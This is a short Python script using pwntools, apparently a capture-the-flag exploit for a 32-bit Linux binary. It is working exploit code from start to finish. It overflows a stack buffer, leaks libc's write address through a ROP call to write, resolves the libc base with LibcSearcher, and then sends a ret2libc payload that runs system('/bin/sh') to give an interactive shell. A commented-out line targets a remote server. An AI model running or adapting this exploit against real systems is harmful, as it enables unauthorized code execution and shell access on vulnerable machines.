from pwn import *
from LibcSearcher import *
context(arch="i386",os="linux",log_level="debug")
p=process("./pwn")
#p=remote("159.138.137.79",54947)
elf = ELF("./pwn")

write_plt = elf.plt["write"]
write_got = elf.got["write"]
start_plt = 0x080484be#elf.symbols["__libc_start_main"]
print(start_plt)

p.recvline()
payload="A"*(0x6c+4)+p32(write_plt)+p32(start_plt)+p32(1)+p32(write_got)+p32(4)
p.sendline(payload)
xx = p.recv()
print(xx)
write_leak = u32(xx[0:4])

print(write_leak)
libc = LibcSearcher("write",write_leak)
libc_base = write_leak - libc.dump("write")
print(libc_base)
system_addr=libc_base + libc.dump("system")
bin_sh_addr = libc_base+ libc.dump("str_bin_sh")

payload="A"*(0x6c+4)+p32(system_addr)+p32(0xdeadbeef)+p32(bin_sh_addr)

p.sendline(payload)
p.interactive()
